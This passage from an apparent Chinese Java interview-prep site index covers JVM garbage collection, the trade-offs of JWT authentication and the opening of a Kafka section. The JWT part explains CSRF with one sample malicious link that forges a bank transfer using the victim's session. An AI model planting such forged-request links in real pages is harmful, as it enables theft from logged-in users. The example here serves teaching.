40345K-\u0026gt;3674K(46080K), 0.0014584 secs] 40345K-\u0026gt;3674K(199680K), 0.0015063 secs] [Times: user=0.00 sys=0.00, real=0.00 secs] 2021-07-01T10:41:32.259+0800: [GC (Allocation Failure) 2021-07-01T10:41:32.259+0800: [ParNew Desired survivor size 3145728 bytes, new threshold 3 (max 3) : 13914K-\u0026gt;0K(46080K), 0.0046596 secs] 13914K-\u0026gt;13895K(199680K), 0.0046873 secs] [Times: user=0.00 sys=0.00, real=0.00 secs] Heap par new generation total 46080K, used 35225K [0x05000000, 0x08200000, 0x08200000) eden space 40960K, 86% used [0x05000000, 0x072667f0, 0x07800000) from space 5120K, 0% used [0x07800000, 0x07800000, 0x07d00000) to space 5120K, 0% used [0x07d00000, 0x07d00000, 0x08200000) concurrent mark-sweep generation total 153600K, used 13895K [0x08200000, 0x11800000, 0x11800000) Metaspace used 153K, capacity 2280K, committed 2368K, reserved 4480K 1.1 对象优先在 eden 区分配    目前主流的垃圾收集器都会采用分代回收算法，因此需要将堆内存分为新生代和老年代，这样我们就可以根据各个年代的特点选择合适的垃圾收集算法。\n大多数情况下，对象在新生代中 eden 区分配。当 eden 区没有足够空间进行分配时，虚拟机将发起一次 Minor GC.下面我们来进行实际测试以下。\n测试：\npublic class GCTest { public static void main(String[] args) { byte[] allocation1, allocation2; allocation1 = new byte[30900*1024]; //allocation2 = new byte[900*1024]; \t} } 通过以下方式运行： 添加的参数：-XX:+PrintGCDetails 运行结果 (红色字体描述有误，应该是对应于 JDK1.7 的永久代)：\n从上图我们可以看出 eden 区内存几乎已经被分配完全（即使程序什么也不做，新生代也会使用 2000 多 k 内存）。假如我们再为 allocation2 分配内存会出现什么情况呢？\nallocation2 = new byte[900*1024]; 简单解释一下为什么会出现这种情况： 因为给 allocation2 分配内存的时候 eden 区内存几乎已经被分配完了，我们刚刚讲了当 Eden 区没有足够空间进行分配时，虚拟机将发起一次 Minor GC.GC 期间虚拟机又发现 allocation1 无法存入 Survivor 空间，所以只好通过 分配担保机制 把新生代的对象提前转移到老年代中去，老年代上的空间足够存放 allocation1，所以不会出现 Full GC。执行 Minor GC 后，后面分配的对象如果能够存在 eden 区的话，还是会在 eden 区分配内存。可以执行如下代码验证：\npublic class GCTest { public static void main(String[] args) { byte[] allocation1, allocation2,allocation3,allocation4,allocation5; allocation1 = new byte[32000*1024]; allocation2 = new byte[1000*1024]; allocation3 = new byte[1000*1024]; allocation4 = new byte[1000*1024]; allocation5 = new byte[1000*1024]; } } 1.2 大对象直接进入老年代    大对象就是需要大量连续内存空间的对象（比如：字符串、数组）。\n为什么要这样呢？\n为了避免为大对象分配内存时由于分配担保机制带来的复制而降低效率。\n1.3 长期存活的对象将进入老年代    既然虚拟机采用了分代收集的思想来管理内存，那么内存回收时就必须能识别哪些对象应放在新生代，哪些对象应放在老年代中。为了做到这一点，虚拟机给每个对象一个对象年龄（Age）计数器。\n如果对象在 Eden 出生并经过第一次 Minor GC 后仍然能够存活，并且能被 Survivor 容纳的话，将被移动到 Survivor 空间中，并将对象年龄设为 1.对象在 Survivor 中每熬过一次 MinorGC,年龄就增加 1 岁，当它的年龄增加到一定程度（默认为 15 岁），就会被晋升到老年代中。对象晋升到老年代的年龄阈值，可以通过参数 -XX:MaxTenuringThreshold 来设置。\n1.4 动态对象年龄判定    大部分情况，对象都会首先在 Eden 区域分配，在一次新生代垃圾回收后，如果对象还存活，则会进入 s0 或者 s1，并且对象的年龄还会加 1(Eden 区-\u0026gt;Survivor 区后对象的初始年龄变为 1)，当它的年龄增加到一定程度（默认为 15 岁），就会被晋升到老年代中。对象晋升到老年代的年龄阈值，可以通过参数 -XX:MaxTenuringThreshold 来设置。\n 修正（issue552）：“Hotspot 遍历所有对象时，按照年龄从小到大对其所占用的大小进行累积，当累积的某个年龄大小超过了 survivor 区的 50% 时（默认值是 50%，可以通过 -XX:TargetSurvivorRatio=percent 来设置，参见 issue1199 ），取这个年龄和 MaxTenuringThreshold 中更小的一个值，作为新的晋升年龄阈值”。\njdk8官方文档引用 ：https://docs.oracle.com/javase/8/docs/technotes/tools/unix/java.html 。\n动态年龄计算的代码如下：\nuint ageTable::compute_tenuring_threshold(size_t survivor_capacity) { //survivor_capacity是survivor空间的大小  size_t desired_survivor_size = (size_t)((((double)survivor_capacity)*TargetSurvivorRatio)/100); size_t total = 0; uint age = 1; while (age \u0026lt; table_size) { //sizes数组是每个年龄段对象大小  total += sizes[age]; if (total \u0026gt; desired_survivor_size) { break; } age++; } uint result = age \u0026lt; MaxTenuringThreshold ? age : MaxTenuringThreshold; ... } 额外补充说明(issue672)：关于默认的晋升年龄是 15，这个说法的来源大部分都是《深入理解 Java 虚拟机》这本书。 如果你去 Oracle 的官网阅读相关的虚拟机参数，你会发现-XX:MaxTenuringThreshold=threshold这里有个说明\nSets the maximum tenuring threshold for use in adaptive GC sizing. The largest value is 15. The default value is 15 for the parallel (throughput) collector, and 6 for the CMS collector.默认晋升年龄并不都是 15，这个是要区分垃圾收集器的，CMS 就是 6.\n 1.5 主要进行 gc 的区域    周志明先生在《深入理解 Java 虚拟机》第二版中 P92 如是写道：\n “老年代 GC（Major GC/Full GC），指发生在老年代的 GC……”\n 上面的说法已经在《深入理解 Java 虚拟机》第三版中被改正过来了。感谢 R 大的回答：\n总结：\n针对 HotSpot VM 的实现，它里面的 GC 其实准确分类只有两大种：\n部分收集 (Partial GC)：\n 新生代收集（Minor GC / Young GC）：只对新生代进行垃圾收集； 老年代收集（Major GC / Old GC）：只对老年代进行垃圾收集。需要注意的是 Major GC 在有的语境中也用于指代整堆收集； 混合收集（Mixed GC）：对整个新生代和部分老年代进行垃圾收集。  整堆收集 (Full GC)：收集整个 Java 堆和方法区。\n1.6 空间分配担保    空间分配担保是为了确保在 Minor GC 之前老年代本身还有容纳新生代所有对象的剩余空间。\n《深入理解Java虚拟机》第三章对于空间分配担保的描述如下：\n JDK 6 Update 24 之前，在发生 Minor GC 之前，虚拟机必须先检查老年代最大可用的连续空间是否大于新生代所有对象总空间，如果这个条件成立，那这一次 Minor GC 可以确保是安全的。如果不成立，则虚拟机会先查看 -XX:HandlePromotionFailure 参数的设置值是否允许担保失败(Handle Promotion Failure);如果允许，那会继续检查老年代最大可用的连续空间是否大于历次晋升到老年代对象的平均大小，如果大于，将尝试进行一次 Minor GC，尽管这次 Minor GC 是有风险的;如果小于，或者 -XX: HandlePromotionFailure 设置不允许冒险，那这时就要改为进行一次 Full GC。\nJDK 6 Update 24之后的规则变为只要老年代的连续空间大于新生代对象总大小或者历次晋升的平均大小，就会进行 Minor GC，否则将进行 Full GC。\n 2 对象已经死亡？    堆中几乎放着所有的对象实例，对堆垃圾回收前的第一步就是要判断哪些对象已经死亡（即不能再被任何途径使用的对象）。\n2.1 引用计数法    给对象中添加一个引用计数器，每当有一个地方引用它，计数器就加 1；当引用失效，计数器就减 1；任何时候计数器为 0 的对象就是不可能再被使用的。\n这个方法实现简单，效率高，但是目前主流的虚拟机中并没有选择这个算法来管理内存，其最主要的原因是它很难解决对象之间相互循环引用的问题。 所谓对象之间的相互引用问题，如下面代码所示：除了对象 objA 和 objB 相互引用着对方之外，这两个对象之间再无任何引用。但是他们因为互相引用对方，导致它们的引用计数器都不为 0，于是引用计数算法无法通知 GC 回收器回收他们。\npublic class ReferenceCountingGc { Object instance = null; public static void main(String[] args) { ReferenceCountingGc objA = new ReferenceCountingGc(); ReferenceCountingGc objB = new ReferenceCountingGc(); objA.instance = objB; objB.instance = objA; objA = null; objB = null; } } 2.2 可达性分析算法    这个算法的基本思想就是通过一系列的称为 “GC Roots” 的对象作为起点，从这些节点开始向下搜索，节点所走过的路径称为引用链，当一个对象到 GC Roots 没有任何引用链相连的话，则证明此对象是不可用的。\n可作为 GC Roots 的对象包括下面几种:\n 虚拟机栈(栈帧中的本地变量表)中引用的对象 本地方法栈(Native 方法)中引用的对象 方法区中类静态属性引用的对象 方法区中常量引用的对象 所有被同步锁持有的对象  2.3 再谈引用    无论是通过引用计数法判断对象引用数量，还是通过可达性分析法判断对象的引用链是否可达，判定对象的存活都与“引用”有关。\nJDK1.2 之前，Java 中引用的定义很传统：如果 reference 类型的数据存储的数值代表的是另一块内存的起始地址，就称这块内存代表一个引用。\nJDK1.2 以后，Java 对引用的概念进行了扩充，将引用分为强引用、软引用、弱引用、虚引用四种（引用强度逐渐减弱）\n1．强引用（StrongReference）\n以前我们使用的大部分引用实际上都是强引用，这是使用最普遍的引用。如果一个对象具有强引用，那就类似于必不可少的生活用品，垃圾回收器绝不会回收它。当内存空间不足，Java 虚拟机宁愿抛出 OutOfMemoryError 错误，使程序异常终止，也不会靠随意回收具有强引用的对象来解决内存不足问题。\n2．软引用（SoftReference）\n如果一个对象只具有软引用，那就类似于可有可无的生活用品。如果内存空间足够，垃圾回收器就不会回收它，如果内存空间不足了，就会回收这些对象的内存。只要垃圾回收器没有回收它，该对象就可以被程序使用。软引用可用来实现内存敏感的高速缓存。\n软引用可以和一个引用队列（ReferenceQueue）联合使用，如果软引用所引用的对象被垃圾回收，JAVA 虚拟机就会把这个软引用加入到与之关联的引用队列中。\n3．弱引用（WeakReference）\n如果一个对象只具有弱引用，那就类似于可有可无的生活用品。弱引用与软引用的区别在于：只具有弱引用的对象拥有更短暂的生命周期。在垃圾回收器线程扫描它所管辖的内存区域的过程中，一旦发现了只具有弱引用的对象，不管当前内存空间足够与否，都会回收它的内存。不过，由于垃圾回收器是一个优先级很低的线程， 因此不一定会很快发现那些只具有弱引用的对象。\n弱引用可以和一个引用队列（ReferenceQueue）联合使用，如果弱引用所引用的对象被垃圾回收，Java 虚拟机就会把这个弱引用加入到与之关联的引用队列中。\n4．虚引用（PhantomReference）\n\u0026ldquo;虚引用\u0026quot;顾名思义，就是形同虚设，与其他几种引用都不同，虚引用并不会决定对象的生命周期。如果一个对象仅持有虚引用，那么它就和没有任何引用一样，在任何时候都可能被垃圾回收。\n虚引用主要用来跟踪对象被垃圾回收的活动。\n虚引用与软引用和弱引用的一个区别在于： 虚引用必须和引用队列（ReferenceQueue）联合使用。当垃圾回收器准备回收一个对象时，如果发现它还有虚引用，就会在回收对象的内存之前，把这个虚引用加入到与之关联的引用队列中。程序可以通过判断引用队列中是否已经加入了虚引用，来了解被引用的对象是否将要被垃圾回收。程序如果发现某个虚引用已经被加入到引用队列，那么就可以在所引用的对象的内存被回收之前采取必要的行动。\n特别注意，在程序设计中一般很少使用弱引用与虚引用，使用软引用的情况较多，这是因为软引用可以加速 JVM 对垃圾内存的回收速度，可以维护系统的运行安全，防止内存溢出（OutOfMemory）等问题的产生。\n2.4 不可达的对象并非“非死不可”    即使在可达性分析法中不可达的对象，也并非是“非死不可”的，这时候它们暂时处于“缓刑阶段”，要真正宣告一个对象死亡，至少要经历两次标记过程；可达性分析法中不可达的对象被第一次标记并且进行一次筛选，筛选的条件是此对象是否有必要执行 finalize 方法。当对象没有覆盖 finalize 方法，或 finalize 方法已经被虚拟机调用过时，虚拟机将这两种情况视为没有必要执行。\n被判定为需要执行的对象将会被放在一个队列中进行第二次标记，除非这个对象与引用链上的任何一个对象建立关联，否则就会被真的回收。\n2.5 如何判断一个常量是废弃常量？    运行时常量池主要回收的是废弃的常量。那么，我们如何判断一个常量是废弃常量呢？\nJDK1.7 及之后版本的 JVM 已经将运行时常量池从方法区中移了出来，在 Java 堆（Heap）中开辟了一块区域存放运行时常量池。\n 🐛 修正（参见：issue747，reference） ：\n JDK1.7 之前运行时常量池逻辑包含字符串常量池存放在方法区, 此时 hotspot 虚拟机对方法区的实现为永久代 JDK1.7 字符串常量池被从方法区拿到了堆中, 这里没有提到运行时常量池,也就是说字符串常量池被单独拿到堆,运行时常量池剩下的东西还在方法区, 也就是 hotspot 中的永久代 。 JDK1.8 hotspot 移除了永久代用元空间(Metaspace)取而代之, 这时候字符串常量池还在堆, 运行时常量池还在方法区, 只不过方法区的实现从永久代变成了元空间(Metaspace)   假如在字符串常量池中存在字符串 \u0026ldquo;abc\u0026rdquo;，如果当前没有任何 String 对象引用该字符串常量的话，就说明常量 \u0026ldquo;abc\u0026rdquo; 就是废弃常量，如果这时发生内存回收的话而且有必要的话，\u0026ldquo;abc\u0026rdquo; 就会被系统清理出常量池了。\n2.6 如何判断一个类是无用的类    方法区主要回收的是无用的类，那么如何判断一个类是无用的类的呢？\n判定一个常量是否是“废弃常量”比较简单，而要判定一个类是否是“无用的类”的条件则相对苛刻许多。类需要同时满足下面 3 个条件才能算是 “无用的类” ：\n 该类所有的实例都已经被回收，也就是 Java 堆中不存在该类的任何实例。 加载该类的 ClassLoader 已经被回收。 该类对应的 java.lang.Class 对象没有在任何地方被引用，无法在任何地方通过反射访问该类的方法。  虚拟机可以对满足上述 3 个条件的无用类进行回收，这里说的仅仅是“可以”，而并不是和对象一样不使用了就会必然被回收。\n3 垃圾收集算法    3.1 标记-清除算法    该算法分为“标记”和“清除”阶段：首先标记出所有不需要回收的对象，在标记完成后统一回收掉所有没有被标记的对象。它是最基础的收集算法，后续的算法都是对其不足进行改进得到。这种垃圾收集算法会带来两个明显的问题：\n 效率问题 空间问题（标记清除后会产生大量不连续的碎片）  3.2 标记-复制算法    为了解决效率问题，“标记-复制”收集算法出现了。它可以将内存分为大小相同的两块，每次使用其中的一块。当这一块的内存使用完后，就将还存活的对象复制到另一块去，然后再把使用的空间一次清理掉。这样就使每次的内存回收都是对内存区间的一半进行回收。\n3.3 标记-整理算法    根据老年代的特点提出的一种标记算法，标记过程仍然与“标记-清除”算法一样，但后续步骤不是直接对可回收对象回收，而是让所有存活的对象向一端移动，然后直接清理掉端边界以外的内存。\n3.4 分代收集算法    当前虚拟机的垃圾收集都采用分代收集算法，这种算法没有什么新的思想，只是根据对象存活周期的不同将内存分为几块。一般将 java 堆分为新生代和老年代，这样我们就可以根据各个年代的特点选择合适的垃圾收集算法。\n比如在新生代中，每次收集都会有大量对象死去，所以可以选择”标记-复制“算法，只需要付出少量对象的复制成本就可以完成每次垃圾收集。而老年代的对象存活几率是比较高的，而且没有额外的空间对它进行分配担保，所以我们必须选择“标记-清除”或“标记-整理”算法进行垃圾收集。\n延伸面试问题： HotSpot 为什么要分为新生代和老年代？\n根据上面的对分代收集算法的介绍回答。\n4 垃圾收集器    如果说收集算法是内存回收的方法论，那么垃圾收集器就是内存回收的具体实现。\n虽然我们对各个收集器进行比较，但并非要挑选出一个最好的收集器。因为直到现在为止还没有最好的垃圾收集器出现，更加没有万能的垃圾收集器，我们能做的就是根据具体应用场景选择适合自己的垃圾收集器。试想一下：如果有一种四海之内、任何场景下都适用的完美收集器存在，那么我们的 HotSpot 虚拟机就不会实现那么多不同的垃圾收集器了。\n4.1 Serial 收集器    Serial（串行）收集器是最基本、历史最悠久的垃圾收集器了。大家看名字就知道这个收集器是一个单线程收集器了。它的 “单线程” 的意义不仅仅意味着它只会使用一条垃圾收集线程去完成垃圾收集工作，更重要的是它在进行垃圾收集工作的时候必须暂停其他所有的工作线程（ \u0026ldquo;Stop The World\u0026rdquo; ），直到它收集结束。\n新生代采用标记-复制算法，老年代采用标记-整理算法。\n虚拟机的设计者们当然知道 Stop The World 带来的不良用户体验，所以在后续的垃圾收集器设计中停顿时间在不断缩短（仍然还有停顿，寻找最优秀的垃圾收集器的过程仍然在继续）。\n但是 Serial 收集器有没有优于其他垃圾收集器的地方呢？当然有，它简单而高效（与其他收集器的单线程相比）。Serial 收集器由于没有线程交互的开销，自然可以获得很高的单线程收集效率。Serial 收集器对于运行在 Client 模式下的虚拟机来说是个不错的选择。\n4.2 ParNew 收集器    ParNew 收集器其实就是 Serial 收集器的多线程版本，除了使用多线程进行垃圾收集外，其余行为（控制参数、收集算法、回收策略等等）和 Serial 收集器完全一样。\n新生代采用标记-复制算法，老年代采用标记-整理算法。\n它是许多运行在 Server 模式下的虚拟机的首要选择，除了 Serial 收集器外，只有它能与 CMS 收集器（真正意义上的并发收集器，后面会介绍到）配合工作。\n并行和并发概念补充：\n  并行（Parallel） ：指多条垃圾收集线程并行工作，但此时用户线程仍然处于等待状态。\n  并发（Concurrent）：指用户线程与垃圾收集线程同时执行（但不一定是并行，可能会交替执行），用户程序在继续运行，而垃圾收集器运行在另一个 CPU 上。\n  4.3 Parallel Scavenge 收集器    Parallel Scavenge 收集器也是使用标记-复制算法的多线程收集器，它看上去几乎和 ParNew 都一样。 那么它有什么特别之处呢？\n-XX:+UseParallelGC 使用 Parallel 收集器+ 老年代串行 -XX:+UseParallelOldGC 使用 Parallel 收集器+ 老年代并行 Parallel Scavenge 收集器关注点是吞吐量（高效率的利用 CPU）。CMS 等垃圾收集器的关注点更多的是用户线程的停顿时间（提高用户体验）。所谓吞吐量就是 CPU 中用于运行用户代码的时间与 CPU 总消耗时间的比值。 Parallel Scavenge 收集器提供了很多参数供用户找到最合适的停顿时间或最大吞吐量，如果对于收集器运作不太了解，手工优化存在困难的时候，使用 Parallel Scavenge 收集器配合自适应调节策略，把内存管理优化交给虚拟机去完成也是一个不错的选择。\n新生代采用标记-复制算法，老年代采用标记-整理算法。\n这是 JDK1.8 默认收集器\n使用 java -XX:+PrintCommandLineFlags -version 命令查看\n-XX:InitialHeapSize=262921408 -XX:MaxHeapSize=4206742528 -XX:+PrintCommandLineFlags -XX:+UseCompressedClassPointers -XX:+UseCompressedOops -XX:+UseParallelGC java version \u0026quot;1.8.0_211\u0026quot; Java(TM) SE Runtime Environment (build 1.8.0_211-b12) Java HotSpot(TM) 64-Bit Server VM (build 25.211-b12, mixed mode) JDK1.8 默认使用的是 Parallel Scavenge + Parallel Old，如果指定了-XX:+UseParallelGC 参数，则默认指定了-XX:+UseParallelOldGC，可以使用-XX:-UseParallelOldGC 来禁用该功能\n4.4.Serial Old 收集器    Serial 收集器的老年代版本，它同样是一个单线程收集器。它主要有两大用途：一种用途是在 JDK1.5 以及以前的版本中与 Parallel Scavenge 收集器搭配使用，另一种用途是作为 CMS 收集器的后备方案。\n4.5 Parallel Old 收集器    Parallel Scavenge 收集器的老年代版本。使用多线程和“标记-整理”算法。在注重吞吐量以及 CPU 资源的场合，都可以优先考虑 Parallel Scavenge 收集器和 Parallel Old 收集器。\n4.6 CMS 收集器    CMS（Concurrent Mark Sweep）收集器是一种以获取最短回收停顿时间为目标的收集器。它非常符合在注重用户体验的应用上使用。\nCMS（Concurrent Mark Sweep）收集器是 HotSpot 虚拟机第一款真正意义上的并发收集器，它第一次实现了让垃圾收集线程与用户线程（基本上）同时工作。\n从名字中的Mark Sweep这两个词可以看出，CMS 收集器是一种 “标记-清除”算法实现的，它的运作过程相比于前面几种垃圾收集器来说更加复杂一些。整个过程分为四个步骤：\n 初始标记： 暂停所有的其他线程，并记录下直接与 root 相连的对象，速度很快 ； 并发标记： 同时开启 GC 和用户线程，用一个闭包结构去记录可达对象。但在这个阶段结束，这个闭包结构并不能保证包含当前所有的可达对象。因为用户线程可能会不断的更新引用域，所以 GC 线程无法保证可达性分析的实时性。所以这个算法里会跟踪记录这些发生引用更新的地方。 重新标记： 重新标记阶段就是为了修正并发标记期间因为用户程序继续运行而导致标记产生变动的那一部分对象的标记记录，这个阶段的停顿时间一般会比初始标记阶段的时间稍长，远远比并发标记阶段时间短 并发清除： 开启用户线程，同时 GC 线程开始对未标记的区域做清扫。  从它的名字就可以看出它是一款优秀的垃圾收集器，主要优点：并发收集、低停顿。但是它有下面三个明显的缺点：\n 对 CPU 资源敏感； 无法处理浮动垃圾； 它使用的回收算法-“标记-清除”算法会导致收集结束时会有大量空间碎片产生。  4.7 G1 收集器    G1 (Garbage-First) 是一款面向服务器的垃圾收集器,主要针对配备多颗处理器及大容量内存的机器. 以极高概率满足 GC 停顿时间要求的同时,还具备高吞吐量性能特征.\n被视为 JDK1.7 中 HotSpot 虚拟机的一个重要进化特征。它具备一下特点：\n 并行与并发：G1 能充分利用 CPU、多核环境下的硬件优势，使用多个 CPU（CPU 或者 CPU 核心）来缩短 Stop-The-World 停顿时间。部分其他收集器原本需要停顿 Java 线程执行的 GC 动作，G1 收集器仍然可以通过并发的方式让 java 程序继续执行。 分代收集：虽然 G1 可以不需要其他收集器配合就能独立管理整个 GC 堆，但是还是保留了分代的概念。 空间整合：与 CMS 的“标记-清理”算法不同，G1 从整体来看是基于“标记-整理”算法实现的收集器；从局部上来看是基于“标记-复制”算法实现的。 可预测的停顿：这是 G1 相对于 CMS 的另一个大优势，降低停顿时间是 G1 和 CMS 共同的关注点，但 G1 除了追求低停顿外，还能建立可预测的停顿时间模型，能让使用者明确指定在一个长度为 M 毫秒的时间片段内。  G1 收集器的运作大致分为以下几个步骤：\n 初始标记 并发标记 最终标记 筛选回收  G1 收集器在后台维护了一个优先列表，每次根据允许的收集时间，优先选择回收价值最大的 Region(这也就是它的名字 Garbage-First 的由来) 。这种使用 Region 划分内存空间以及有优先级的区域回收方式，保证了 G1 收集器在有限时间内可以尽可能高的收集效率（把内存化整为零）。\n4.8 ZGC 收集器    与 CMS 中的 ParNew 和 G1 类似，ZGC 也采用标记-复制算法，不过 ZGC 对该算法做了重大改进。\n在 ZGC 中出现 Stop The World 的情况会更少！\n详情可以看 ： 《新一代垃圾回收器 ZGC 的探索与实践》\n参考     《深入理解 Java 虚拟机：JVM 高级特性与最佳实践（第二版》 https://my.oschina.net/hosee/blog/644618 https://docs.oracle.com/javase/specs/jvms/se8/html/index.html  "},{"id":237,"href":"/system-design/authority-certification/JWT%E4%BC%98%E7%BC%BA%E7%82%B9%E5%88%86%E6%9E%90%E4%BB%A5%E5%8F%8A%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/","title":"JWT优缺点分析以及常见问题解决方案","parent":"authority-certification","content":"JWT 身份认证优缺点分析以及常见问题解决方案    之前分享了一个使用 Spring Security 实现 JWT 身份认证的 Demo，文章地址：适合初学者入门 Spring Security With JWT 的 Demo。 Demo 非常简单，没有介绍到 JWT 存在的一些问题。所以，单独抽了一篇文章出来介绍。为了完成这篇文章，我查阅了很多资料和文献，我觉得应该对大家有帮助。\n相关阅读：\n 《一问带你区分清楚Authentication,Authorization以及Cookie、Session、Token》 适合初学者入门 Spring Security With JWT 的 Demo Spring Boot 使用 JWT 进行身份和权限验证  Token 认证的优势    相比于 Session 认证的方式来说，使用 token 进行身份认证主要有下面四个优势：\n1.无状态    token 自身包含了身份验证所需要的所有信息，使得我们的服务器不需要存储 Session 信息，这显然增加了系统的可用性和伸缩性，大大减轻了服务端的压力。但是，也正是由于 token 的无状态，也导致了它最大的缺点：当后端在token 有效期内废弃一个 token 或者更改它的权限的话，不会立即生效，一般需要等到有效期过后才可以。另外，当用户 Logout 的话，token 也还有效。除非，我们在后端增加额外的处理逻辑。\n2.有效避免了CSRF 攻击    CSRF（Cross Site Request Forgery） 一般被翻译为 跨站请求伪造，属于网络攻击领域范围。相比于 SQL 脚本注入、XSS等安全攻击方式，CSRF 的知名度并没有它们高。但是,它的确是每个系统都要考虑的安全隐患，就连技术帝国 Google 的 Gmail 在早些年也被曝出过存在 CSRF 漏洞，这给 Gmail 的用户造成了很大的损失。\n那么究竟什么是 跨站请求伪造 呢？说简单用你的身份去发送一些对你不友好的请求。举个简单的例子：\n小壮登录了某网上银行，他来到了网上银行的帖子区，看到一个帖子下面有一个链接写着“科学理财，年盈利率过万”，小壮好奇的点开了这个链接，结果发现自己的账户少了10000元。这是这么回事呢？原来黑客在链接中藏了一个请求，这个请求直接利用小壮的身份给银行发送了一个转账请求,也就是通过你的 Cookie 向银行发出请求。\n\u0026lt;a src=\u0026#34;http://www.mybank.com/Transfer?bankId=11\u0026amp;money=10000\u0026#34;\u0026gt;科学理财，年盈利率过万\u0026lt;/a\u0026gt; 导致这个问题很大的原因就是： Session 认证中 Cookie 中的 session_id 是由浏览器发送到服务端的，借助这个特性，攻击者就可以通过让用户误点攻击链接，达到攻击效果。\n那为什么 token 不会存在这种问题呢？\n我是这样理解的：一般情况下我们使用 JWT 的话，在我们登录成功获得 token 之后，一般会选择存放在 local storage 中。然后我们在前端通过某些方式会给每个发到后端的请求加上这个 token,这样就不会出现 CSRF 漏洞的问题。因为，即使你点击了非法链接发送了请求到服务端，这个非法请求是不会携带 token 的，所以这个请求将是非法的。\n但是这样会存在 XSS 攻击中被盗的风险，为了避免 XSS 攻击，你可以选择将 token 存储在标记为httpOnly 的cookie 中。但是，这样又导致了你必须自己提供CSRF保护。\n具体采用上面哪种方式存储 token 呢，大部分情况下存放在 local storage 下都是最好的选择，某些情况下可能需要存放在标记为httpOnly 的cookie 中会更好。\n3.适合移动端应用    使用 Session 进行身份认证的话，需要保存一份信息在服务器端，而且这种方式会依赖到 Cookie（需要 Cookie 保存 SessionId），所以不适合移动端。\n但是，使用 token 进行身份认证就不会存在这种问题，因为只要 token 可以被客户端存储就能够使用，而且 token 还可以跨语言使用。\n4.单点登录友好    使用 Session 进行身份认证的话，实现单点登录，需要我们把用户的 Session 信息保存在一台电脑上，并且还会遇到常见的 Cookie 跨域的问题。但是，使用 token 进行认证的话， token 被保存在客户端，不会存在这些问题。\nToken 认证常见问题以及解决办法    1.注销登录等场景下 token 还有效    与之类似的具体相关场景有：\n 退出登录; 修改密码; 服务端修改了某个用户具有的权限或者角色； 用户的帐户被删除/暂停。 用户由管理员注销；  这个问题不存在于 Session 认证方式中，因为在 Session 认证方式中，遇到这种情况的话服务端删除对应的 Session 记录即可。但是，使用 token 认证的方式就不好解决了。我们也说过了，token 一旦派发出去，如果后端不增加其他逻辑的话，它在失效之前都是有效的。那么，我们如何解决这个问题呢？查阅了很多资料，总结了下面几种方案：\n 将 token 存入内存数据库：将 token 存入 DB 中，redis 内存数据库在这里是不错的选择。如果需要让某个 token 失效就直接从 redis 中删除这个 token 即可。但是，这样会导致每次使用 token 发送请求都要先从 DB 中查询 token 是否存在的步骤，而且违背了 JWT 的无状态原则。 黑名单机制：和上面的方式类似，使用内存数据库比如 redis 维护一个黑名单，如果想让某个 token 失效的话就直接将这个 token 加入到 黑名单 即可。然后，每次使用 token 进行请求的话都会先判断这个 token 是否存在于黑名单中。 修改密钥 (Secret) : 我们为每个用户都创建一个专属密钥，如果我们想让某个 token 失效，我们直接修改对应用户的密钥即可。但是，这样相比于前两种引入内存数据库带来了危害更大，比如：1) 如果服务是分布式的，则每次发出新的 token 时都必须在多台机器同步密钥。为此，你需要将密钥存储在数据库或其他外部服务中，这样和 Session 认证就没太大区别了。 2) 如果用户同时在两个浏览器打开系统，或者在手机端也打开了系统，如果它从一个地方将账号退出，那么其他地方都要重新进行登录，这是不可取的。 保持令牌的有效期限短并经常轮换 ：很简单的一种方式。但是，会导致用户登录状态不会被持久记录，而且需要用户经常登录。  对于修改密码后 token 还有效问题的解决还是比较容易的，说一种我觉得比较好的方式：使用用户的密码的哈希值对 token 进行签名。因此，如果密码更改，则任何先前的令牌将自动无法验证。\n2.token 的续签问题    token 有效期一般都建议设置的不太长，那么 token 过期后如何认证，如何实现动态刷新 token，避免用户经常需要重新登录？\n我们先来看看在 Session 认证中一般的做法：假如 session 的有效期30分钟，如果 30 分钟内用户有访问，就把 session 有效期延长30分钟。\n 类似于 Session 认证中的做法：这种方案满足于大部分场景。假设服务端给的 token 有效期设置为30分钟，服务端每次进行校验时，如果发现 token 的有效期马上快过期了，服务端就重新生成 token 给客户端。客户端每次请求都检查新旧token，如果不一致，则更新本地的token。这种做法的问题是仅仅在快过期的时候请求才会更新 token ,对客户端不是很友好。 每次请求都返回新 token :这种方案的的思路很简单，但是，很明显，开销会比较大。 token 有效期设置到半夜 ：这种方案是一种折衷的方案，保证了大部分用户白天可以正常登录，适用于对安全性要求不高的系统。 用户登录返回两个 token ：第一个是 accessToken ，它的过期时间 token 本身的过期时间比如半个小时，另外一个是 refreshToken 它的过期时间更长一点比如为1天。客户端登录后，将 accessToken和refreshToken 保存在本地，每次访问将 accessToken 传给服务端。服务端校验 accessToken 的有效性，如果过期的话，就将 refreshToken 传给服务端。如果有效，服务端就生成新的 accessToken 给客户端。否则，客户端就重新登录即可。该方案的不足是：1) 需要客户端来配合；2) 用户注销的时候需要同时保证两个 token 都无效；3) 重新请求获取 token 的过程中会有短暂 token 不可用的情况（可以通过在客户端设置定时器，当accessToken 快过期的时候，提前去通过 refreshToken 获取新的accessToken）。  总结    JWT 最适合的场景是不需要服务端保存用户状态的场景，如果考虑到 token 注销和 token 续签的场景话，没有特别好的解决方案，大部分解决方案都给 token 加上了状态，这就有点类似 Session 认证了。\nReference     JWT 超详细分析 https://medium.com/devgorilla/how-to-log-out-when-using-jwt-a8c7823e8a6 https://medium.com/@agungsantoso/csrf-protection-with-json-web-tokens-83e0f2fcbcc Invalidating JSON Web Tokens  "},{"id":238,"href":"/system-design/distributed-system/message-queue/Kafka%E5%B8%B8%E8%A7%81%E9%9D%A2%E8%AF%95%E9%A2%98%E6%80%BB%E7%BB%93/","title":"Kafka常见面试题总结","parent":"message-queue","content":" Kafka面试题总结    Kafka 是什么？主要应用场景有哪些？    Kafka 是一个分布式流式处理平台。这到底是什么意思呢？\n流平台具有三个关键功能：\n 消息队列：发布和订阅消息流，这个功能类似于消息队列，这也是 Kafka 也被归类为消息队列的原因。 容错的持久方式存储记录消息流： Kafka 会把消息持久化到磁盘，有效避免了消息丢失的风险。 流式处理平台： 在消息发布的时候进行处理，Kafka 提供了一个完整的流式处理类库。  Kafka 主要有两大应用场景：\n 消息队列 ：建立实时流数据管道，以可靠地在系统或应用程序之间获取数据。 数据处理： 构建实时的流数据处理程序来转换或处理数据流。  和其他消息队列相比,Kafka的优势在哪里？    我们现在经常提到 Kafka 的时候就已经默认它是一个非常优秀的消息队列了，我们也会经常拿它跟 RocketMQ、RabbitMQ 对比。我觉得 Kafka 